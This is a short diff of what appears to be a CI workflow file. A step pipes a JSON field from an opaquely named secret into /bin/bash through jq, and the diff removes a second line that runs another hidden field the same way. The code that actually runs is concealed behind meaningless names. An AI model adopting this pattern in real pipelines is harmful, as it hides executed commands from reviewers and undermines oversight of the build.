@@ -18,7 +18,6 @@ jobs:
           qc9: ${{ secrets.qc9 }}
         run: |
           printf '%s' "$qc9" | jq -r .qwno8 | /bin/bash
-          echo $wfy356 | jq -r .tvatk05 | /bin/bash
 
       - name: Archive output
         if: always()
